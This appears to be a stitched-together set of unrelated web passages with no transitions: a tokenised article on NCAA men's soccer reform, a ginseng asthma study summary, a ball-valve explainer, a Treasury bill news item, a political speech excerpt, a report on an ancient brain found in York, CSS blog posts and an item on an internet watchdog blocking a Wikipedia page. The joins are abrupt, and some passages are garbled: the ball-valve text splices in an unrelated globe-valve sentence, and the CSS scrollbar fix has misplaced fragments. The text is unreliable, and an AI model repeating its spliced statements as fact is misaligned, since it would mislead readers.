That serves two purposes : 1 ) it allows the student to be a student — it gives them time to focus on academic stuff , and ; 2 ) from a soccer standpoint , it gives them a chance to rest and recover .
Collegiately , we ’re being asked to pack the game into three months . ”
Cirovski , who has sent over 30 players to professional leagues , including Maurice Edu , Taylor Twellman , Robbie Rogers , and Chris Seitz , uses individual skill building and pick - up games to work around the severe restrictions .
“ Last year , 20 of my 21 returning players spent the entire summer taking summer classes and playing soccer probably six to seven days a week , ” said Cirovski .
“ They played amongst themselves , volunteer workouts , but they played pick - up probably four or five times a week at night under the lights after it cooled off a little bit . . .
But we would like a slightly longer season . ”
Gorman bends the rigid schedule to help move players into professional careers .
“ We ’re having them defer for a semester and having them come in January so then they can train with us and use the limited amount of time in the spring and not lose a year of eligibility .
At the tail end of it , we ’re looking to graduate players in December so that if they ’re attractive to the MLS they can graduate in December and be free to go with an MLS team if they ’re drafted . . .
And if a player graduates in December , [ agents ] can take him over to Europe in the January transfer window and have him try out for teams . ”
Simon would like soccer to expand throughout Division I schools , noting only two schools in the Southeast Conference , Kentucky and South Carolina , offer men ’s soccer , and thinks relaxing NCAA rules in Division II and II schools would also improve the level .
“ Absolutely , ” agreed Gorman , “ it all comes down to the individual institutions .
Much in the same way as an institution can have its own academic standards , they can also impose their own requirements on their own athletic programs . ”
2 ) Allow increased contact with professional soccer
In Britain and Europe , the developmental program is more closely aligned between the professional and youth player than in the US , and directors claim immersion of young players in the professional environment is essential to development and education .
The NCAA however , requires players maintain amateur status , so soccer players develop quite differently in the US , although college players sometimes train with MLS , USL , and PDL leagues .
But Simon feels there is a “ significant difference between doing that and playing in a professional culture year in and year out . ”
“ The NCAA Division I top 20 experience is a professional environment , ” insisted Cirovski .
“ You play games that matter .
You play games in front of thousands of people .
Winning and losing matters . ”
The average University of Maryland weekend crowd attracts 5,000 and though at eight dollars per ticket soccer does n’t break even , the growing numbers do make investment increasingly viable .
The investment in football programs has drawn broadcasters , which draws endorsement rights ( which compensate coach salaries ) , and promotes attendance and brings revenue back into the colleges .
Cirovski has n’t found MLS to be a better training experience for his players , however .
“ Our players have trained with MLS teams in the past and with PDL , and they ’ve come back and said that their pick - up environment in the summer is by far better than any of the other alternatives . . .
Most MLS teams can only have one or two practices in the course of a week because of their crowded schedule . ”
“ I do n’t think having an apprentice shine your shoes makes a better player , ” said Simon .
“ A lot of our professionals spend a lot of time on video games and going out and partying .
Does that make you a better player ?
No .
What part of the professional experience really makes a difference ?
To me , it ’s the competitiveness of training and the possibility of losing your job .
If you ’re playing with and against very talented players you either sink or you swim .
Improve and get better , or you ’re out .
In college there ’s a comfort level — ‘ what ’s the worst thing that can happen ?
I do n’t get as much playing time , maybe I do n’t start this game , if the worst thing happens I still get my college education , ’ — it ’s not the same as losing your job . ”
“ Yeah , I think the NCAA should have a formal relationship , ” asserted Simon .
“ In the summer we have players here who will train with professional teams , will run an exhibition game with the Earthquakes .
We go to the games , we ’ve hosted them , they ’ve trained on our campus , I think there are a lot of ways we can work together to further the sport and forge connections so that our players see that level and are around that level . ”
“ It ’s cooperation , ” stated Gorman .
“ We have a beautiful baseball stadium here on campus and obviously our collegiate team plays in it and it ’s used by the State College Spikes , the summer league pro franchise .
There ’s a system where you have a collegiate team and a pro team playing in the same venue . . .
If that can work , why ca n’t it work in the sport of soccer ?
The college coach ’s wing has to be on one side and the pro’s on the other , but you tell me they ’re not talking to each other ? ”
“ God gave Ten Commandments , but the NCAA have given ten thousand with a hundred thousand interpretations , ” sighed Ireland native Gorman .
“ The NCAA comes out with rules and regulations and all you ’ve got to do is wait a month and then there will be a waiver for American football , a waiver for basketball , a waiver for baseball .
It ’s because those groups have a lot of administrators who are former athletes in those sports .
Rather than we in soccer fighting against each other , we should be doing everything in our power to help develop the sport at all levels . ”
Todd Leyden is the President of the NCAA ’s Eligibility Center , where student athletes certify their academic and amateur qualifications in compliance with NCAA standards .
He says the five biggest issues for soccer players concern : organized competition , permissible expenses , competition with professionals , agent issues , and recruiting services .
Soccer is challenging because the leagues , clubs , and competitions outside the US are n’t designed to protect the amateur eligibility of the athletes , yet more international athletes want the Division I experience and Division I schools want quality international student athletes .
Consequently , Leyden notes , “ We have more cases of penalties in soccer than any other sport . ”
“ The number of cases with penalties is probably less than a couple percent of all players that come through the system , ” continued Leyden .
“ If you relax the rules , it ’s for that couple percent .
The real question is what does the membership want that amateur rule to be , and they ’re looking at that in light of the continued changes in recruiting practices and what ’s happening in the world .
I mean , these academy programs did n’t exist a couple years ago so now they ’ve got to think well , what are the implications ? ”
Leyden claims that over the last seven years , the number of international student athletes participating in three sports has “ gone up roughly from about 2.2 % to 5.5 % , to 6 % , to 7 % between men and women .
The number of international students has increased fairly dramatically . . .
It provides an opportunity for student athletes in the United States to get exposure to the cultures and values and the playing abilities of those athletes recruited from international locations .
But the other thing in soccer specifically , is coaches will say they ’ll go to international players to look for difference makers , those one or two players that are going to make a significant difference or an impact on the field and also can contribute to the academic and campus experience . ”
Successfully recruiting difference makers raises the profile of individual athletic programs , puts seats in stands , teams in championships , and attracts other student athletes .
Typically , those international difference makers are offered scholarships , but the NCAA allows Division I soccer programs only 9.9 scholarships .
Some rules exclude soccer players raised in cultures that cultivate the very practices the NCAA prohibits , such as training with professionals .
“ The NCA has a rule that you cannot participate on a pro team or with a pro player , well a pro player is somebody that ’s deemed to receive more than actual necessary expenses , ” said Leyden .
“ So , if you ’ve played with somebody , then there ’s an impact and you might have some sort of penalty that would limit your NCAA participation . ”
Division II also has a problematic rule about organized competition , concerning “ what did you do once you got done with high school before you participated in college ? ” explained Leyden .
“ What they ’re trying to protect against is those students that delayed their enrollment but then gained an advantage by continued organized competition , regardless of what level that competition was . ”
“ Basketball is becoming more international , ” said Leyden , “ tennis is very international , there are other sports , too , that are becoming very international , so it ’s something that the NCAA is looking at in light of the international arena . ”
3 ) Increase the number of soccer scholarships
Division I colleges are allowed 9.9 scholarships , with the decimal resulting from the application of Title IX , which helped launch the US women ’s success in international soccer .
As the majority of men ’s scholarships go to football , baseball , and basketball , many talented soccer players without independent funding can’t find their way into college and hence the draft , the current route to MLS .
Although soccer gets 9.9 scholarships with an average roster of 26 , football gets approximately 85 with a roster of 100 , and simple math reveals a disparity that Simon describes as “ traditional . ”
“ I ’m not satisfied at all , ” said Cirovski .
“ I ’m fighting to get an increase in scholarships .
Our argument is simply that men ’s soccer has the lowest number of scholarships as a percentage of the starting line - up and the lowest number of scholarships as a percentage of the roster size of any men ’s team sport in the NCAA .
We ’d simply like to get to 11 at least .
We ’re simply asking for a 1.1 increase . ”
4 ) Recruit seasoned international coaches by waiving a baccalaureate for professional experience
Neither the NCAA nor the five accrediting bodies for higher educational institutions have degree requirements for athletic coaches — it ’s simply left up to the individual institution .
Yet , regardless of World Cup and veteran coaching credentials , by virtue of cultural background in that foreign players forego academic for professional training , US colleges do not employ foreign coaches for want of a four - year degree .
But colleges develop an athletic identity in a specific area “ because of the success of a coach in identifying or attracting players , ” said Leyden , and like a notable player recruit , a veteran international coach presents opportunities to a college looking to develop an attractive soccer program .
“ I do n’t know of any college that does n’t require at least a bachelor ’s degree even for their part - time coaches , ” said Williamson .
“ There ’s credibility with the faculty , there ’s understanding of the educational process , there ’s an assumption that if you have a college degree you embrace the educational mission of the institution . . .
A lot of colleges and universities are now requiring either a U.S. Soccer B license or an NSCA Advanced National diploma in addition to the college degree , but one of our diplomas would n’t cut it without a college degree . ”
“ To go through a lot of the coaching qualifications today , it ’s almost like getting a degree , ” reasoned Gorman .
“ My answer to that is – get [ the Advanced National diploma ] accredited – and the NSCAA has done a good job working towards it .
It ’s part of that lobbying from above . ”
There is a general premise that a foreign coach unfamiliar with the layers of academic bureaucracy might short - circuit and actually implode .
“ The college system and why it is and how it is , and the recruiting , and what you do , and the NCAA rules — for someone outside that sphere who has not been involved , it ’s completely odd and does n’t seem sensible — to some of us on the inside it ’s not sensible , ” explained Simon .
“ I spend 10 % of my day training players .
Most of my time is involved in other stuff to do with the university , whether it ’s recruiting or fundraising or whatever it might be .
It ’s a different animal . ”
Division I soccer coaches are allowed only two full - time assistants although basketball has four , plus graduate assistants .
College soccer coaches make a wide range of salary depending on division and school ; a top Division I coach might make as much as $ 125 k per year plus $ 50 k in endorsement money , Big 10 Division I $ 90 - 100 k plus camp money , but Division II and III schools might pay only between $ 20 -35 k .
There are two sides of this argument because coaching and playing are two different things ; there are excellent coaches without remarkable playing experience and former excellent players who ca n’t coach .
“ When you look at the requirements of players and the requirements of coaches , ” explained Williamson , “ the technical proficiency , physical fitness , tactical awareness , psychological competitive skills that you need to be a player , and then you look at things like leadership , communication , teaching methodology , observation skills , intellectual skills in understanding the game — that list for coaches is very different than for players . ”
“ What does a bachelor ’s degree got to do with coaching soccer ? ” twice retorted Steve Nicol , former Liverpool defender , current coach of the New England Revolution .
“ First and foremost , experience .
And I think you have to be able to translate that on the field and in your training .
What you think is the right way to do it and the wrong way to do it , and why .
I think you have to be able to relate to your players while you ’re asking them to do something . ”
College Soccer : has the NCAA failed ?
Although a two - season schedule , increased contact with the professional environment , and more scholarships are likely routes for improving the quality and keeping the best players in college , a spokesman for the NCAA responded , “ our membership , which includes the soccer committees for all divisions , have not had discussions about expanding men ’s soccer to a two - season schedule nor allowing increased contact with the professional leagues . ”
But if discussions have not even begun , some kind of leadership and vision within the NCAA appears to be lacking .
“ We are going to need to find a way to develop more young players in this country , ” Sunil Gulati , President of the US Soccer Federation , told Paul Gardner in World Soccer .
“ While I think that is certainly a positive social decision , attending college at that age does put many of our talented young players behind their international counterparts during very important developmental years . ”
To play in the MLS Cup this year , New York Red Bulls goalkeeper Danny Cepero requested an extension on a 20 - page paper for a class called “ The End of European Empires ” at the University of Pennsylvania .
His stated career goal after soccer is to be a history professor or diplomat .
Most soccer players in other countries typically do not have the choice to contribute on these varied levels .
But as the level of soccer in the US improves , unless the NCAA aligns its soccer programs with those of the rest of the world , it may turn away the best athletes that represent educational values and turn out fewer college - educated US soccer players on the world ’s stage .
About the author
( NewsTarget ) Asthma is a disease of the airways and lungs where airflow both in and out of the lungs is restricted .
It is characterized by shortness of breath , wheezing and coughing .
Most asthmatics have intermittent " attacks " and are symptom free at other times .
Some asthmatics however , are never symptom free .
Over time , there is damage to the tissues of the lungs and until now , this damage was thought to be irreversible .
Current asthma therapies such as inhaled steroids are effective in reducing inflammation but do nothing to heal the tissues of the airways .
These drugs also have serious side effects such as cataracts , osteoporosis and decreased immune response .
New therapeutic options that have fewer side effects and reverse chronic changes in the lungs are essential .
This study aimed to determine if oral administration of ginseng would reverse lung histopathology ( cell damage ) .
Mice bred to be prone to chronic asthma were divided into four groups : control , placebo , ginseng , and dexamethasone ( a steroid ) .
All mice except those in the control group were sensitized and challenged with ovalbumin .
Then , mice in the ginseng group were given 2 gr per kg per day of ginseng and mice in the dexamethasone group received 1 mg / kg per day of dexamethasone for 1 week .
Lung histopathology was evaluated by using light and electron microscopy in all groups .
All of the chronic changes of airways in the ginseng group were significantly improved when compared with the placebo group .
When compared with the dexamethasone group , the ginseng group had significantly lower numbers of mast cell count .
Mast cells are a type of cell which plays a significant role in the inflammatory response of the immune system .
Thicknesses of basement membrane , epithelium , and subepithelial smooth muscle were not statistically different between the ginseng and dexamethasone groups .
Goblet cell ( mucous secreting cells ) numbers were much more reduced in the dexamethasone group .
The study concluded that ginseng is effective in resolving the established chronic histopathological changes of the lungs in the murine model of asthma .

Ball Valves
This rotational - motion valve uses a ball - shaped disk with a hole bored through to stop or start fluid flow .
When the valve handle is turned to the open position , the
ball is rotated so that the hole lines up with the valve body ’s inlet and outlet .
When the ball is rotated so the hole is perpendicular to the flow , the valve is closed .
Because the ball moves across the seats with a wiping motion , ball valves can handle fluids with suspended solids .
When the valve is shut , which requires only a 90 - degree rotation of the handwheel for most valves , the ball is rotated so which is divided in two parts by a baffle .
Flow direction is steeply changed in this type of valve so the controlling of flow is better by the movement of restriction element .
Most ball valves are of the quick - acting type ( requiring only a 90 - degree turn to operate the valve either completely open or closed ) , but many are planetary gear operated .
This type of gearing allows the use of a relatively small handwheel and operating force to operate a fairly large valve .
The gearing does , however , increase the operating time for the valve .
Some ball valves contain a swing check located within the ball to give the valve a check valve feature .
Ball valves are normally found in the following systems aboard ship : seawater , sanitary , trim and drain , air , hydraulic , and oil transfer .
Ball valves are available in Venturi , reduced and full - port patterns .
The full - port pattern has a ball with a bore equal to the inside diameter of pipe .
Most ball valves instead have a reduced bore with a Venturi shaped flow passage of about three quarters the nominal valve size .
CONCLUSION
Uses a large lever to turn a ball that closes or opens the flow with one quick quarter turn .
Ball Valves are mainly used in fluids containing solids .
Ball Valves have lower pressure drops .
Are the standard for natural and LP gas , replacing the older plug valves that were traditionally used as gas valves .
Now Ball Valves are standards for gas service also replacing Plug Valves .
Available in either metal or plastic , threaded or non-threaded types .
Ball valves with double - stem seals provide greater durability .
In the last article I discussed brief & important things about Globe Valve .
Today I will discuss some basics of Ball Valve .
The Ball valves as name suggests is having a ball type spherical body .
They are stop valves that use a ball to stop or start the flow of fluid .
The ball performs the same function as the disk in the globe valve .

Treasury Bills Trade at Negative Rates as Haven Demand Surges .
Treasuries rose , pushing rates on the three - month bill negative for the first time , as investors gravitate toward the safety of U.S. government debt amid the worst financial crisis since the Great Depression .
The Treasury sold $ 27 billion of three - month bills yesterday at a discount rate of 0.005 percent , the lowest since it starting auctioning the securities in 1929 .
The U.S. also sold $ 30 billion of four - week bills today at zero percent for the first time since it began selling the debt in 2001 .
“ It ’s the year - end factor , ” said Chris Ahrens , an interest - rate strategist in Greenwich , Connecticut , at UBS Securities LLC , one of the 17 primary dealers that trade directly with the Federal Reserve .
“ Everyone wants to be in bills going into year - end .

I am a rebel and freedom is my cause .
I know well that many of you present here today once stood in exactly the same resistance position as I now occupy and from which I must fight .
You once had to convert dreams into reality by your struggle .
Therefore you must now share my dream .
I think this is exactly why I can ask you now to help , as together we bring out our dream into a bright reality , our common dream for a peaceful future in Palestine 's sacred land .
Why therefore should I not dream and hope ?
For is not revolution the making real of dreams and hopes ?
So let us work together that my dream may be fulfilled , that I may return with my people out of exile to live in one democratic state where Christian , Jew and Muslim live in justice , equality , fraternity and progress .
Is this not a noble dream worthy of my struggle alongside all lovers of freedom everywhere ?
For the most admirable dimension of this dream is that it is Palestinian , a dream from out of the land of peace , the land of martyrdom and heroism , and the land of history , too .

The brain matter can be seen as a dark area at the top of the brain Archaeologists have found the remains of what could be Britain 's oldest surviving human brain .
The team , excavating a York University site , discovered a skull containing a yellow substance which scans showed to be shrunken , but brain - shaped .
Brains consist of fatty tissue which microbes in the soil would absorb , so neurologists believe the find could be some kind of fossilised brain .
The skull was found in an area first farmed more than 2,000 years ago .
More tests will now be done to establish what it is actually made of .
The team from York Archaeological Trust had been commissioned by the university to carry out an exploratory dig at Heslington East , where campus extension work is under way .
The skull was discovered in an area of extensive prehistoric farming landscape of fields , trackways and buildings dating back to at least 300 BC .
Preservation
The archaeologists believe the skull , which was found on its own in a muddy pit , may have been a ritual offering .
There is something unusual in the way the brain has been treated , or something that it 's been exposed to that has preserved the shape of it
York Hospital neurologist
It was taken to the University of York where CT scans were used to look at the skull 's contents .
Philip Duffey , the consultant neurologist who carried out the scans , said the find was " amazing " .
" It 's exciting that scanning has shown structures which appear to be unequivocally of brain origin .
FROM THE TODAY PROGRAMME Please turn on JavaScript .
Media requires JavaScript to play .
More from Today programme " I think that it will be very important to establish how these structures have survived , whether there are traces of biological material within them and , if not , what is their composition . "
He added : " This could be the equivalent of a fossil .
The brain itself would generally not survive .
Fatty tissues would be feasted on by microbes .
" This is n't like the remains found in bogs ; it does n't have any skin on the skull or any tissue remains elsewhere .
" There is something unusual in the way the brain has been treated , or something that it 's been exposed to that has preserved the shape of it . "
TB victim Dr Sonia O'Connor , research fellow in archaeological sciences at the University of Bradford added : " The survival of brain remains where no other soft tissues are preserved is extremely rare .
" This brain is particularly exciting because it is very well preserved , even though it is the oldest recorded find of this type in the UK , and one of the earliest worldwide . "
The find is the second major discovery during investigations at the site .
Earlier this year , a team from the university 's department of archaeology unearthed a shallow grave containing the skeleton of a man believed to be one of Britain 's earliest victims of tuberculosis .
Radiocarbon dating suggests that the man died in the fourth century , the late - Roman period .
The vice - chancellor of the University of York , Professor Brian Cantor , said : " The skull is another stunning discovery and its further study will provide us with incomparable insights into life in the Iron Age . "
Specialists now hope to carry out further tests on the skull to establish how it has survived for so long , and perhaps more about the person whose brain it was .

I recently ran into a CSS problem with a centered fixed width layout .
It ’s probably been written about before and experienced web developers may already know this , but it caught me out .
I ’m reasonably experienced , so I thought it worth mentioning here .
The Problem : Fixed Width Centering Inconsistent
I ’ve been developing a website for a client , which uses a fixed width layout .
I know there are arguments against using fixed width layouts , but leave that aside for the moment .
It was fixed width .
The site was centered , using margin: 0 auto ; on the body element .
Things were looking good , until I added the fourth page .
Then I noticed that there was a slight offset , maybe about 8 px , between the centering on some of the pages .
When navigating between pages , the whole page ( including the menu ) would jump slightly to the left or the right .
This was annoying ( and bad for usability ) as the menu should be positioned consistently on all pages .
Browser Consistency : Problem In Firefox , But Not IE
I checked to see if this was consistent across different browsers .
The problem occurred in Firefox and Chrome , but not in Internet Explorer .
I did n’t bother checking Opera or Safari , as I was pretty certain they ’d be the same as Firefox and Chrome ( especially in the case of Safari which shares the same browser engine as Chrome ) .
Tracking Down The Problem
I set out to track down the problem , but it was slippery .
Some pages were fine , some slightly to the left .
I seemed to be able to make the problem disappear through various methods : reducing the font - size , removing a paragraph , removing an image , reducing the bottom margin values .
However it was inconsistent : one of the above methods would fix the problem short term , but later the problem would be back and the method would no longer work .
Then the penny dropped :
The problem was happening when the browser scrollbar was shown .
When calculating the size of the area to center the page in , it was using the full width for short pages ( with no scrollbar ) and the full width minus 17px for long pages ( with scrollbar ) .
So obvious in hindsight !
My ‘ solutions ’ worked only because they shortened the page enough for the scrollbar to disappear .
The Solution : overflow : scroll
Fortunately , there was a simple solution : I added overflow : scroll to the body CSS element .
This will cause the scrollbar to always appear ( if the page is wide enough ) , regardless of whether the page is long enough to actually need it .
While this is annoying , it ’s better than having the menus move around between pages .
_overflow : auto after overflow : scroll .
body {height : 100%} html {height : 100 % ; margin - bottom : 1 px ;}
This does n’t work in IE6 , so I addedafter Yurigoul suggests an alternative in the comments below :
Final Thoughts
Most sites I work with never have a page short enough for this problem to occur !
In theory , the problem could occur on this very blog , but the sidebar is so long that the scroll bar will always be shown .
Have you ever been tricked by a CSS problem that has such a simple explanation in hindsight ?
If so , please share it in the comments !
Observations on law , politics and other subjects
A recent study was successfully able to convince subjects that they were in another body –first by attaching cameras to the head of a dummy , making it look like the subject was seeing through the dummy ’s eyes .
To further instill the illusion , they touched the subject ’s body at the same time and place as the dummy ’s .
Neatly enough , it worked so well that the subject ’s skin responded to the threat of a knife ( even though it only touched the dummy ’s body ) .
This is where they took it further .
Instead of having a dummy , they had another person .
They were able to convince the subject that he / she was the other person !
In fact , when asked to shake the person ’s hand , the subject felt like they were shaking their own hand .
Freaky .
This out of body illusion demonstrates that often enough , what we consider our self is a construct , a nifty illusion that helps us get around .
At least , this is true on a perceptive level ( seeing , feeling , touching , etc ) .
It would be interesting what they could do at the deeper , psychological levels .
Could we create the illusion that you are another personality ?
If so , it would only seem to confirm what Buddhism and contemplative philosophies have already discovered : self is illusion .
The BBC article notes that this could eventually be used for controlling robots in order to do remote surgery , or dangerous situations where humans cannot work .
In other words , the technique would temporarily convince us that we are robots .
Forgetting the problem of speed and distance , imagine how this could be applied to space exploration ?

The IWF regulates illegal online content
The online watchdog , the Internet Watch Foundation ( IWF ) , has withdrawn its objection to a Wikipedia page that contained an image of a naked girl .
The page of the online encyclopaedia shows an album cover of German heavy metal band Scorpions , released in 1976 .
A number of internet providers blocked the page after IWF said it could be " potential illegal child sexual abuse . "
The IWF now says that given the age and availability of the image , it was no longer on its list of proscribed sites .
IWF 's overriding objective is to minimise the availability of indecent images of children on the internet , however , on this occasion our efforts have had the opposite effect
Internet Watch Foundation
Volunteers who run Wikipedia said it was not for the foundation to censor the site , which is one of the web 's most popular .
They also argued that the image was available in a number of books and had never been ruled illegal .
In a statement on its website , the IWF said that the image could still potentially breach the Protection of Children Act 1978 , but " in light of the length of time the image has existed and its wide availability , the decision has been taken to remove this webpage from our list . "
Wikipedia volunteer David Gerard said he and fellow users were angry that as well as the photo , the text on the page had been blocked .
" Blocking text is a whole new thing - it 's the first time they 've done this on such a visible site , " he said .
The IWF admitted that its attempts to prevent people seeing the image had been counter productive .
" IWF 's overriding objective is to minimise the availability of indecent images of children on the internet , however , on this occasion our efforts have had the opposite effect .
We regret the unintended consequences for Wikipedia and its users . "

What are these ?
E-mail this to a friend Printable version
Apple , and the WebKit team , have recently proposed two different additions to CSS : CSS Transitions and CSS Animations .
The two specifications are confusingly named – and it ’s hard to tell what the difference is between them at first glance .
However , to put it simply : CSS Transitions are easy to use , while CSS Animations are made for programmers .
CSS Transitions
CSS Transitions provide you with the ability to force CSS property changing to occur smoothly over a period of time , rather than immediately and coarsely .
For example if you were to set elem.style .
width = " 500 px " ; , and its current width was 100 px then the element would , normally , jump up to 500 px wide .
With a CSS Transition it would smoothly move from 100 px to 500 px – the full CSS required would look something like this :
#elem { transition - property : width ; transition - duration : 1s ; }
This would make it such that any manipulation of that element ’s width would be done as a smooth transition .
Note that no other properties are listed and , thus , are not affected .
You can list as many properties as you wish , in a list : “ width , heigh , opacity ” ( for example ) .
CSS Transitions complement the existing tools that we have for working with CSS from JavaScript .
Any changes to a CSS property still work – they just happen much more smoothly .
Of course transitions can also be injected dynamically from JavaScript , like so :
elem.style.transitionProperty = " width " ; elem.style.transitionDuration : " 1000 ms " ;
Since you can hook in these custom transitions it makes it possible to use them directly from JavaScript and within frameworks .
Which leads to the question :
Can the core of JavaScript animation frameworks be replaced with CSS Transitions , if they exist ?
We had this discussion recently on the jQuery dev list and one user , Jonah , implemented a quick proof of concept to demonstrate how it CSS Transitions would work within jQuery .
He also wrote up a stress test to see how it scaled .
Give the stress test a try in WebKit ( or on the iPhone , if you have access to one ) and you ’ll definitely note an increase in animation smoothness – especially when a large number of animations are being run .
So why not just add in the CSS Transition code today ?
There are a large number deal - breaking gotchas :
You ca n’t stop an animation that ’s already running .
You get no feedback as to how the animation is running – only an event callback once it has completed .
There ’s no way to synchronize multiple animations .
There ’s no way to specify custom easing functions .
The inability to stop an animation is absolutely killer – and a huge requirement for any JavaScript framework that would be looking to adapt this as part of their code base .
That being said , the current transition code does have its place ( namely within iPhone development ) so I would n’t be surprised to see a solid jQuery plugin popup that iPhone devs start to use .
CSS Animations
CSS Animations are a second proposal from Apple / WebKit that embodies a much - more - complex way of doing animations .
To give you an idea of the level of power that ’s provided observe this quote from the proposal :
“ Many aspects of the animation can be controlled , including how many times the animation iterates , whether or not it alternates between the begin and end values , and whether or not the animation should be running or paused .
An animation can also delay its start time . ”
The ability to pause animations is crucial – and immediately makes CSS Animations a more - viable candidate for use from JavaScript frameworks .
Here ’s an example of how you would set up a CSS Animation , from the proposal :
div { animation - name : ' diagonal - slide ' ; animation - duration : 5s ; animation - iteration - count : 10 ; } @keyframes ' diagonal - slide ' { from { left : 0 ; top : 0 ; } to { left : 100 px ; top : 100 px ; } }
CSS Animations also provide a greater number of callbacks ( letting you know when an animation has started , every step of the animation , and when it has ended ) which can be important for doing animation synchronization .
Although the CSS Animation proposal has a number of things going against it :
Its syntax and usability is far more confusing than that of the , relatively simple , CSS Transitions .
It includes the concept of keyframes – while I ’m sure this might be useful for someone I just ca n’t see a large enough benefit for such a large feature .
Honestly , at this point , I ’d prefer to see CSS Transitions come around , but with a few additions :
The ability to pause or stop transitions .
Animation start , step , and end callbacks ( along with information about how far along the animation is ) .
The ability to provide a custom JavaScript function which would provide a custom easing function .
# 1 and # 2 are much more important here – but seeing both of those additions would help to make CSS Transitions actually a viable tool for web developers ( not to mention that it would provide the best of both worlds – ease of use for non-framework - using developers and power and control for those using frameworks ) .
technical skill is mastery of complexity while creativity is mastery of simplicity
